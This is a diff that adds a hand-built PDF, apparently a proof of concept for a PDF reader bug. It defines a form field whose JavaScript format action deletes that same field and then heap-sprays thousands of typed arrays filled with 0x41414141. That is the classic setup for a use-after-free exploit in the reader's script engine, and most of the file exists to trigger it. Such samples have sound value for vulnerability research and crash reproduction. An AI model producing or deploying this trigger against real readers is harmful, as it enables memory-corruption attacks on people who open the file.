@@ -1,0 +1,234 @@
+%PDF-1.7
+% ò¤ô
+1 0 obj <<
+  /Type /Catalog
+  /Pages 2 0 R
+  /AcroForm 4 0 R
+  /OpenAction 10 0 R
+>>
+endobj
+2 0 obj <<
+  /Type /Pages
+  /Count 2
+  /Kids [
+    30 0 R
+    31 0 R
+  ]
+>>
+endobj
+% Page number 0.
+30 0 obj <<
+  /Type /Page
+  /Parent 2 0 R
+  /Annots [
+    7 0 R
+    ]
+  /AA << /C 14 0 R >>
+>>
+endobj
+% Page number 0.
+31 0 obj <<
+  /Type /Page
+  /Parent 2 0 R
+  /Annots [
+    8 0 R
+    ]
+>>
+endobj
+% Forms
+4 0 obj <<
+  /XFA [
+    (xdp:xdp) 43 0 R
+    (form) 49 0 R
+    (</xdp:xdp>) 50 0 R
+  ]
+  /Fields [
+    5 0 R
+    ]
+>>
+endobj
+% Fields
+5 0 obj <<
+  /T (MyField)
+  /Type /Annot
+  /Subtype /Widget
+  /AA <</F 12 0 R>>
+  /Kids [6 0 R]
+
+>>
+endobj
+% Fields
+6 0 obj <<
+  /FT /Tx
+  /Parent 5 0 R
+  /Kids [ 7 0 R 8 0 R]
+
+>>
+endobj
+% Fields
+7 0 obj <<
+
+  /Type /Annot
+  /Subtype /Widget
+  /Parent 6 0 R
+  /Rect [0 0 1000 1000]
+
+>>
+endobj
+% Fields
+8 0 obj <<
+  /Type /Annot
+  /Subtype /Widget
+  /Parent 6 0 R
+  /Rect [400 400 600 600]
+>>
+endobj
+% JS Action
+10 0 obj <<
+  /Type /Action
+  /S /JavaScript
+  /JS 11 0 R
+>>
+endobj
+% JS program to exexute
+11 0 obj <<
+>>
+stream
+
+endstream
+endobj
+% OpenAction Format Action for MyField
+12 0 obj <<
+  /Type /Action
+  /S /JavaScript
+  /JS 13 0 R
+>>
+endobj
+% JS program to exexute
+13 0 obj <<
+>>
+stream
+function spray() {
+gc();
+spray_array = new Array(0x20000);
+for (var i = 0 ; i < 10000 ; i++)
+{
+    spray_array[i] = new Uint32Array(0x300);
+    for (var j = 0; j < spray_array[i].length ; j++ )
+    {
+        spray_array[i][j] = 0x41414141;
+    }
+}
+return spray_array;
+}
+this.baseURL+="1";
+if(this.baseURL == "11"){
+  this.removeField("MyField");
+  spray();
+}
+endstream
+endobj
+% close page action
+14 0 obj <<
+  /Type /Action
+  /S /JavaScript
+  /JS 15 0 R
+>>
+endobj
+% JS program to exexute
+15 0 obj <<
+>>
+stream
+
+endstream
+endobj
+% KeyStroke
+16 0 obj <<
+  /Type /Action
+  /S /JavaScript
+  /JS 17 0 R
+>>
+endobj
+% JS program to exexute
+17 0 obj <<
+>>
+stream
+
+endstream
+endobj
+43 0 obj <<
+>>stream
+<?xml version="1.0" encoding="UTF-8"?>
+<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
+endstream
+endobj
+49 0 obj <<
+>>stream
+<config></config>
+<template></template>
+endstream
+endobj
+50 0 obj <<
+>>stream
+</xdp:xdp>
+endstream
+endobj
+xref
+0 51
+0000000000 65535 f 
+0000000015 00000 n 
+0000000107 00000 n 
+0000000000 65535 f 
+0000000414 00000 n 
+0000000548 00000 n 
+0000000664 00000 n 
+0000000744 00000 n 
+0000000850 00000 n 
+0000000000 65535 f 
+0000000959 00000 n 
+0000001051 00000 n 
+0000001130 00000 n 
+0000001222 00000 n 
+0000001640 00000 n 
+0000001732 00000 n 
+0000001784 00000 n 
+0000001876 00000 n 
+0000000000 65535 f 
+0000000000 65535 f 
+0000000000 65535 f 
+0000000000 65535 f 
+0000000000 65535 f 
+0000000000 65535 f 
+0000000000 65535 f 
+0000000000 65535 f 
+0000000000 65535 f 
+0000000000 65535 f 
+0000000000 65535 f 
+0000000000 65535 f 
+0000000207 00000 n 
+0000000326 00000 n 
+0000000000 65535 f 
+0000000000 65535 f 
+0000000000 65535 f 
+0000000000 65535 f 
+0000000000 65535 f 
+0000000000 65535 f 
+0000000000 65535 f 
+0000000000 65535 f 
+0000000000 65535 f 
+0000000000 65535 f 
+0000000000 65535 f 
+0000001916 00000 n 
+0000000000 65535 f 
+0000000000 65535 f 
+0000000000 65535 f 
+0000000000 65535 f 
+0000000000 65535 f 
+0000002040 00000 n 
+0000002118 00000 n 
+trailer <<
+  /Root 1 0 R
+>>
+startxref
+2167
+%%EOF
